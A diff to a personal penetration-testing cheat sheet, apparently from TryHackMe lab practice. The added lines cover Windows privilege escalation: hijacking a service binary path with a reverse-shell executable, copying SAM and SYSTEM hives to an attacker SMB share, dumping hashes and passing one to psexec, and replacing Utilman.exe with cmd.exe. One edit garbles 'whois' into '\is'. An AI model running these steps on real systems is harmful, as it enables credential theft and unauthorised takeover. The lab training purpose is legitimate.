@@ -4,7 +4,7 @@ Open source intelligence
 
 ## Tools
 
-`whois` to query the WHOIS database
+`\is` to query the WHOIS database
 `nslookup`, `dig`, or `host` to query DNS servers
 
 ## Search sites
@@ -140,18 +140,6 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 Version
 ```
 lsb_release -a
-```
-
-## Node.js
-```
-curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
-sudo apt-get install -y nodejs
-```
-
-## Clone this repo
-
-```
-git clone https://github.com/tornord/tryhackme.git
 ```
 
 ## Get the IP address
@@ -360,4 +348,97 @@ nc -lvp 4444
 Rerun the task
 ```
 schtasks /run /tn vulntask
+```
+
+## AD Delegation 
+
+```
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Pr$
+Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+```
+
+## Accesschk
+
+To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite.
+
+accesschk64.exe -qlc thmservice
+
+## schtasks commands
+
+Schedules commands and programs to run periodically or at a specific time, adds and removes tasks from the schedule, starts and stops tasks on demand, and displays and changes scheduled tasks.
+
+```
+schtasks change
+schtasks create
+schtasks delete
+schtasks end
+schtasks query
+schtasks run
+```
+
+## Controlling a Service Using SC
+
+The Windows SDK contains a command-line utility, Sc.exe, that can be used to control a service. Its commands correspond to the functions provided by the SCM. The syntax is as follows.
+
+https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query
+
+```
+sc query
+sc query type=service
+SC query type=service | FIND "SERVICE_NAME"
+sc query THMService
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+sc config THMService binPath="C:\Users\thm-unpriv\rev-svc3.exe" obj=LocalSystem
+sc stop THMService
+sc start THMService
+```
+
+## whoami
+
+```
+whoami /all
+```
+
+## Registry SAM
+
+Registry: HKEY_LOCAL_MACHINE\SAM
+SAM = Security Accounts Manager.
+SAM contains local user account and local group membership information, including their passwords.
+Password information and privileges for domain users and groups are stored in Active Directory.
+Because of the sensitivity of the data that is stored in this database, SYSTEM privileges are needed to open this registry key. This is possible with the Sysinternals tool PsExec.
+
+## SMB server
+
+Start a share on the attacker machine
+```
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+Access it from the windows machine
+```
+dir \\10.10.7.8\public
+```
+
+## Impacket
+
+Save the registry to a share
+```
+reg save hklm\system \\10.10.7.8\public\system.hive
+reg save hklm\sam \\10.10.7.8\public\sam.hive
+```
+
+On the attacker machine
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam share/sam.hive -system share/system.hive LOCAL
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.136.180
+```
+
+## Windows take ownership
+
+Run in cmd.exe as administrator
+```
+takeown /f C:\Windows\System32\Utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+C:\Windows\System32\> copy cmd.exe utilman.exe
 ```
